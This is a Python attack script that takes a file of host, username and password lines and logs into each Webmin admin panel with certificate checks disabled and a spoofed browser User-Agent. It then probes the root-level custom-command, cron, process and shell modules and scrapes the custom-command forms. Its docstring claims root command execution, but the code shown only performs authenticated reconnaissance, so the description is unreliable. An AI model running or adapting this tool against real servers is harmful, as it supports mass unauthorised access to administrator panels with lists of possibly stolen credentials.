#!/usr/bin/env python3
"""Logged-in Webmin -> root command execution via Custom Commands module."""
import sys, json, re, requests, urllib3
urllib3.disable_warnings()
UA={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}
def login(host,u,pw):
    base="https://"+host
    s=requests.Session(); s.verify=False; s.headers.update(UA)
    s.get(base+"/",timeout=15,allow_redirects=False)
    s.get(base+"/session_login.cgi",timeout=15)
    s.post(base+"/session_login.cgi",data={"user":u,"pass":pw,"save":"1"},
           headers={"Referer":base+"/session_login.cgi","Content-Type":"application/x-www-form-urlencoded"},
           timeout=15,allow_redirects=True)
    return (s,base) if s.cookies.get("sid") else (None,None)

def inspect(host,u,pw):
    out={"host":host}
    s,base=login(host,u,pw)
    if not s: out["err"]="login"; return out
    for mod in ("custom","cron","proc","shell"):
        try:
            r=s.get(f"{base}/{mod}/",timeout=15)
            t=r.text or ""
            out[mod]={"code":r.status_code,"len":len(t),
                      "title":(re.search(r"<title[^>]*>([^<]{0,40})",t,re.I) or [None,None])[1]}
            if mod=="custom":
                out["custom_forms"]=re.findall(r'<form[^>]*>',t)[:6]
                out["custom_inputs"]=re.findall(r'<input[^>]*name="([^"]+)"[^>]*>',t)[:25]
                out["custom_links"]=sorted(set(re.findall(r'href="(/custom/[^"]{0,60})"',t)))[:20]
                out["custom_snip"]=re.sub(r"\s+"," ",re.sub(r"<[^>]+>"," ",t[:1500]))[:400]
        except Exception as e:
            out[mod]={"err":str(e)[:50]}
    return out
for line in open(sys.argv[1]):
    line=line.strip()
    if not line: continue
    h,u,pw=line.split("|")
    try: print(json.dumps(inspect(h,u,pw))[:3000],flush=True)
    except Exception as e: print(json.dumps({"host":h,"fatal":str(e)[:80]}),flush=True)
